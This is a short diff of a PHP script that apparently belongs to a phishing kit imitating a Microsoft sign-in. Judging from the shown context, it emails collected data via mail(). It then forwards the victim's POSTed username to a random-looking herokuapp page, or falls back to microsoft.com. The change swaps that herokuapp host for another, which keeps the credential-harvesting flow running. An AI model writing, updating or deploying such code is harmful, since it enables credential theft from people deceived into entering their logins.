@@ -18,7 +18,7 @@ mail("$to", "$send", "$subject", $message);
 }
 $praga=rand();
 $praga=md5($praga);
-  header ("Location: https://subupdateslocale-resistance.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
+  header ("Location: https://wnefguewgof78436f8oe7wgfuw.herokuapp.com/reverse2.php?nameu=".$_POST['nameu']);
 }else{
 header ("Location: https://www.microsoft.com/undefined");
 }
